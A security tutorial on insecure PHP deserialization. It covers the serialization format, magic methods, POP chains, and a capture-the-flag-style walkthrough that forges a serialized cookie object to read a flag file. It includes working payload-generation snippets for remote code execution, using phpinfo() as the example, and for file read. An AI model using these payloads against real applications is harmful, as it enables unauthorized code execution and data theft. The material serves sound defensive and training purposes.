**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
- Write complex data to inter-process memory, a file, or a database;
- Send complex data, for example, over a network, between different components of an application, or in an API call.

**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.

Many programming languages offer native support for serialization. Exactly how objects are serialized depends on the language. Some languages serialize objects into binary formats, whereas others use different string formats, with varying degrees of human readability. Note that all of the original object's attributes are stored in the serialized data stream, including any private fields. To prevent a field from being serialized, it must be explicitly marked as "transient" in the class declaration.

**Insecure deserialization is when user-controllable data is deserialized by a website**. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

**An object of an unexpected class might cause an exception. By this time, however, the damage may already be done**. Many deserialization-based attacks are completed before deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.

<br>
<br>

Insecure deserialization typically arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should never be deserialized at all.
However, sometimes website owners think they are safe because they implement some form of additional check on the deserialized data. This approach is often ineffective because it is virtually impossible to implement validation or sanitization to account for every eventuality. These checks are also fundamentally flawed as they rely on checking the data after it has been deserialized, which in many cases will be too late to prevent the attack.

# Identify insecure deserialization

Identifying insecure deserialization is relatively simple regardless of whether you are whitebox or blackbox testing.
During auditing, you should look at all data being passed into the website and try to identify anything that looks like serialized data. Serialized data can be identified relatively easily if you know the format that different languages use.


# Insecure deserialization in PHP

For example, this code snippet will serialize the object called user:

```php
<?php
class User{
    public $username;
    public $status;
}
$user = new User;
$user->username = 'vickie';
$user->status = 'not admin';
echo serialize($user);
?>
```

This code create a class called "User". Each User object will contain a "username" and a "status" attribute.

If you run this code the printed outped will be:

```php
O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
```

- b:THE_BOOLEAN;
- i:THE_INTEGER;
- d:THE_FLOAT;
- s:LENGTH_OF_STRING:"ACTUAL_STRING";
- a:NUMBER_OF_ELEMENTS:{ELEMENTS}
- O:LENGTH_OF_NAME:"CLASS_NAME":NUMBER_OF_PROPERTIES:{PROPERTIES}

Our serialized object is an object of the class user. It has two properties: username and status. Each one is a string. 


When you’re ready to operate on the object again, you can deserialize the string with unserialize():

```php
<?php
class User{
    public $username;
    public $status;
}

$user = new User;
$user->username = 'vickie';
$user->status = 'not admin';
$serialized_string = serialize($user);
$unserialized_data = unserialize($serialized_string);
var_dump($unserialized_data);
var_dump($unserialized_data["status"]);
?>
```

It unserializes the string and stores the restored object into the variable ```$unserialized_data```.

## Manipulate the PHP object

- Intercept with a proxy the serialized object;
- Decode (for example from base64) the object;
- Change the value in the object;
- Re-apply the encoding (e.g. base64 and URL encoding).

Example:

    ```php
    O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:9:"not admin";}
    ```

    Will become this:

    ```php
    O:4:"User":2:{s:8:"username";s:6:"vickie";s:6:"status";s:5:"admin";}
    ```

# unserialize() under the hood (magic methods)

PHP magic methods are method names in PHP that have special properties.

If the serialized object’s class implements any method with a magic name, these methods will have magic properties, such as being automatically run during certain points of execution, or when certain conditions are met. Two of these magic methods are ```__wakeup()``` and ```__destruct()```.

The ```__wakeup()``` method is used during instantiation when the program creates an instance of a class in memory, which is what ```unserialize()``` does. It takes the serialized string, which specifies the class and the properties of that object, and uses that data to create a copy of the originally serialized object. It then searches for the ```__wakeup()``` method and executes code in it.

When no references to the deserialized object exist, the program calls the ```__destruct()``` function to clean up the object. This method often contains useful code in terms of exploitation. For example, if a ```__destruct()``` method contains code that deletes and cleans up files associated with the object, the attacker might be able to mess with the integrity of the filesystem by controlling the input passed into those functions.

Example:

```php
class Example2 {
    private $hook;
    function __construct(){
        // some PHP code...
    }

    function __wakeup(){
        if (isset($this->hook)) eval($this->hook);
    }
}
// some PHP code...
$user_data = unserialize($_COOKIE['data']);
```


The code declares a class called Example2. It has a ```$hook``` attribute and two methods: __construct() and __wakeup() . The ```__wakeup()```function executes the string stored in $hook as PHP code if $hook is not empty. The PHP ```eval()``` function takes in a string and runs the content of the string as PHP code. Then, the program runs ```unserialize()``` on a user-supplied cookie named data.

Here, you can achieve RCE because the code passes a user-provided object into unserialize(), and there is an object class, Example2, with a magic method that automatically runs eval() on user-provided input when the object is instantiated.

To exploit this RCE, you’d set your data cookie to a serialized Example2 object, and the hook property to whatever PHP code you want to execute. You can generate the serialized object by using the following code snippet:

```php
class Example2 {
    private $hook = "phpinfo();";
}

print urlencode(serialize(new Example2));
```

Before we print the object, we need to URL-encode it , since we’ll be injecting the object via a cookie. Passing the string generated by this code into the data cookie will cause the server to execute the PHP code ```phpinfo();```, which outputs information about PHP’s configuration on the server.

Exists other magic methods:
- ```__wakeup()```;
- ```__call()```;
- ```__toString()```;
- ```__destruct()```.

Unlike ```__wakeup()``` and ```__destruct()```, which always get executed if the object is created, the ```__toString()``` method is invoked only when the object is treated as a string. It allows a class to decide how it will react when one of its objects is treated as a string.

For example, it can decide what to display if the object is passed into an ```echo()``` or ```print()``` function.

A program invokes the ```__call()``` method when an undefined method is called. For example, a call to ```$object->undefined($args)``` will turn into ```$object->__call('undefined', $args)```.


# POP chains

POP means Property-oriented Programming (POP) chain. is a type of exploit whose name comes from the fact that the attacker controls all of the deserialized object’s properties.

POP chains work by stringing bits of code together, called gadgets, to achieve the attacker’s ultimate goal. These gadgets are code snippets borrowed from the codebase. POP chains use magic methods as their initial gadget. **Attackers can then use these methods to call other gadgets**.

Example:
```php
class Example {
    private $obj;
    function __construct() {
        // some PHP code...
    }
    function __wakeup() {
        if (isset($this->obj)) return $this->obj->evaluate();
    }
}

class CodeSnippet {
    private $code;
    function evaluate() {
        eval($this->code);
    }

}
// some PHP code...
$user_data = unserialize($_POST['data']);
// some PHP code...
```

In this application, the code defines two classes: Example and CodeSnippet. Example has a property named obj, and when an Example object is deserialized, its wakeup() function is called, which calls obj’s ```evaluate()``` method.

The CodeSnippet class has a property named code that contains the code string to be executed and an ```evaluate()``` method, which calls eval() on the code string.

In another part of the code, the program accepts the POST paameter data from the user and calls ```unserialize()``` on it.

Since that last line contains an insecure deserialization vulnerability, an attacker can use the following code to generate a serialized object:
```php
class CodeSnippet {
    private $code = "phpinfo();";
}
class Example {
    private $obj;
    function __construct() {
        $this->obj = new CodeSnippet;
    }
}
print urlencode(serialize(new Example));
```

This code snippet defines a class named CodeSnippet and set its code property to ```phpinfo();```.

Then it defines a class named Example, and sets its obj property to a new CodeSnippet instance on instantiation.

Finally, it creates an Example instance, serializes it, and URL-encodes the serialized string. The
attacker can then feed the generated string into the POST parameter data.

Notice that the attacker’s serialized object uses class and property names found elsewhere in the application’s source code. As a result, the program will do the following when it receives the crafted data string.

First, it will unserialize the object and create an Example instance. Then, since Example implements __wakeup(), the program will call __wakeup() and see that the obj property is set to a CodeSnippet instance. Finally, it will call the evaluate() method of the obj, which runs eval("phpinfo();"), since the attacker set the code property to phpinfo(). The attacker is able to execute any PHP code of their choosing.

<br>
<br>
<br>
<br>

An example:

During an assessment we found in the "robots.txt" that ```.phps``` extension is enabled on a web application.

This means that we can call every web page by changing the ```.php``` extension to the ```.phps``` one and this will show us the php code of the page instead render the same.

We know that the login web page is "index.php". So we can read the source code of this one by calling "index.phps".

This is the source code of the login page:

```php
<?php
if (is_guest() || $perm_res->is_admin()) {
    // Serialize the permission result, encode it in base64, and set it as a cookie
    setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
    
    // Redirect to the authentication page
    header("Location: authentication.php");
    die();
} else {
    // Set an error message for invalid login
    $msg = 'Invalid Login.';
}
?>
```

The interesting part here is that there is a redirection to the "authentication.php" page. We can call "authenticaton.phps" to read the PHP source code of that page.

```php
<?php
class access_log {
    private $log_file;

    public function __construct($lf) {
        $this->log_file = $lf;
    }

    public function __toString() {
        return $this->read_log();
    }

    public function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    public function read_log() {
        return file_get_contents($this->log_file);
    }
}

require_once("cookie.php");

if (isset($perm) && $perm->is_admin()) {
    $msg = "Welcome admin";
    $log = new access_log("access.log");
    $log->append_to_log("Logged in at " . date("Y-m-d") . "\n");
} else {
    $msg = "Welcome guest";
}
?>
```

By analizing this code we can see a page called "cookie.php".

```php
class User {
    private $username;
    private $password;

    public function __construct($u, $p) {
        $this->username = $u;
        $this->password = $p;
    }

    public function __toString() {
        return $this->username . $this->password;
    }

    private function getUserData() {
        $con = new SQLite3("../users.db");
        $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
        $stm->bindValue(1, $this->username, SQLITE3_TEXT);
        $stm->bindValue(2, $this->password, SQLITE3_TEXT);
        $res = $stm->execute();
        return $res->fetchArray();
    }

    public function is_guest() {
        $userData = $this->getUserData();
        return isset($userData["username"]) && $userData["admin"] != 1;
    }

    public function is_admin() {
        $userData = $this->getUserData();
        return isset($userData["username"]) && $userData["admin"] == 1;
    }
}

if (isset($_COOKIE["login"])) {
    try {
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    } catch (Error $e) {
        die("Deserialization error. " . $e->getMessage());
    }
}
?>
```

So we know that there is an ```access_log object``` and we know that this gets instantiated with the call to the file ```access.log``` on the server. Let's recreate this quickly in php:

```php
<?php
class access_log {
    private $log_file;

    public function __construct($lf) {
        $this->log_file = $lf;
    }

    public function __toString() {
        return $this->read_log();
    }

    public function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    public function read_log() {
        return file_get_contents($this->log_file);
    }
}

    $object = new access_log("../flag");
    // ../flag is the location given in the hint!

    $serializedObject = serialize($object);

    echo $serializedObject;
?>
```

This is the returned string: ```O:10:"access_log":1:{s:20:"access_loglog_file";s:7:"../flag";}```

We can encode it in base64 and url encode because of this operation on the cookie string: ```$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));``` by modifying ```$serializedObject = serialize($object);``` with ```$serializedObject = urlencode(base64_encode(serialize($object)));``` in our php code.

Now, we can send this cookie to the web application at the web URL ```/authentication.php```.